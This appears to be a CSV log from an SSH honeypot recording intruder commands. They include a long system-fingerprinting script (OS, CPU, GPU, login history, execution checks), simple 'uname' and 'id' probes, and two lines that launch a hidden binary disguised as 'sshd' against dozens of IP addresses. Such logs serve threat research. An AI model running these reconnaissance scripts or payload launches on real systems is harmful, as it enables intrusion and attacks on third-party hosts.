timestamp,src_ip,session,command
2026-08-10T16:37:30.580582Z,193.32.162.84,8bf393a4ac3b,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '""' ) || echo """")
arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q ""lm"" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 8"" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 7"" /proc/cpuinfo && echo armv7l ) || echo """")
uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null)
cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c ""^processor"" /proc/cpuinfo 2>/dev/null)
cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E ""^model name"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E ""^Hardware"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 )
gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null )
last_output=$(last 2>/dev/null)
filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' ""$out"" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 )
echo ""UNAME:$uname""
echo ""ARCH:$arch""
echo ""UPTIME:$uptime""
echo ""CPUS:$cpus""
echo ""CPU_MODEL:$cpu_model""
echo ""GPU:$gpu_info""
echo ""LAST:$last_output""
echo ""FILTER:$filter_output"""
2026-08-10T17:50:11.884615Z,20.205.97.67,c9ecea10aa40,uname -a
2026-08-10T20:29:08.124430Z,195.178.110.228,c5e7588d38e1,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '""' ) || echo """")
arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q ""lm"" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 8"" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 7"" /proc/cpuinfo && echo armv7l ) || echo """")
uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null)
cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c ""^processor"" /proc/cpuinfo 2>/dev/null)
cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E ""^model name"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E ""^Hardware"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 )
gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null )
last_output=$(last 2>/dev/null)
filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' ""$out"" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 )
echo ""UNAME:$uname""
echo ""ARCH:$arch""
echo ""UPTIME:$uptime""
echo ""CPUS:$cpus""
echo ""CPU_MODEL:$cpu_model""
echo ""GPU:$gpu_info""
echo ""LAST:$last_output""
echo ""FILTER:$filter_output"""
2026-08-10T21:33:42.877773Z,92.5.66.49,f0c0840f1f57,id
2026-08-10T21:51:19.346934Z,92.5.66.49,d743a0b49139,id
2026-08-11T00:00:48.377620Z,92.5.66.49,6a2b753b8923,uname -a
2026-08-11T00:01:11.167340Z,92.5.66.49,1ab7febc1df4,uname -a
2026-08-11T12:13:14.909830Z,161.35.46.137,aeee50bd8420,uname -a
2026-08-11T16:02:50.441662Z,115.191.33.55,45623d8ad2c6,chmod +x ./.538338129263800168/sshd;nohup ./.538338129263800168/sshd 101.91.114.194 122.193.64.145 202.134.23.229 148.72.168.29 111.170.34.11 116.171.167.70 192.140.185.8 178.33.12.170 121.228.250.70 101.96.202.189 41.225.238.233 45.195.83.7 42.4.62.108 0.0.0.0 91.198.110.233 138.99.79.29 94.182.108.57 18.144.49.152 223.243.162.130 91.98.167.202 112.91.141.230 163.53.201.45 170.84.39.236 45.126.120.53 203.189.196.168 80.249.147.192 117.25.149.146 203.186.60.250 106.13.209.152 39.175.51.58 65.181.92.228 138.197.163.192 115.190.225.133 106.13.121.200 77.246.111.220 182.43.19.187 42.51.38.195 45.118.144.36 49.72.111.25 115.190.155.149 87.120.84.66 120.202.189.21 172.245.43.228 222.170.175.95 175.4.52.243 180.108.46.6 41.93.28.4 52.53.35.215 183.224.79.111 103.210.22.17 5.175.218.27 &
2026-08-11T18:17:54.435285Z,183.61.119.194,77e5c95e56f1,chmod +x ./.6443242768827232890/sshd;nohup ./.6443242768827232890/sshd 150.241.245.107 18.145.77.44 172.245.43.228 198.46.174.168 140.206.107.98 2.189.130.67 192.140.185.8 45.234.176.26 39.175.51.58 120.55.71.51 77.246.111.220 89.238.165.139 65.181.92.228 49.72.111.25 158.51.96.38 103.172.198.2 51.195.223.189 106.13.209.152 101.91.114.194 118.122.147.195 220.182.61.204 160.187.174.22 116.171.167.70 182.43.19.187 151.59.157.2 27.0.135.12 222.170.175.95 65.0.173.111 94.184.35.179 96.125.137.54 183.61.119.194 132.243.19.184 177.70.2.194 45.126.120.53 121.28.170.66 115.190.155.149 101.36.228.201 31.77.145.89 115.190.225.133 8.153.170.250 183.62.159.92 120.92.105.170 175.6.141.237 103.3.247.65 147.90.235.216 103.139.101.114 161.129.211.63 223.243.162.130 41.225.238.233 103.166.226.235 170.84.39.236 &
2026-08-12T08:21:43.294102Z,47.93.9.23,7021bbb1ab26,uname -a
2026-08-12T22:46:05.274472Z,162.243.4.4,c5216eca886f,/bin/./uname -s -v -n -r -m
2026-08-12T22:51:08.490598Z,164.92.81.209,7c4ef5d1faff,/bin/./uname -s -v -n -r -m
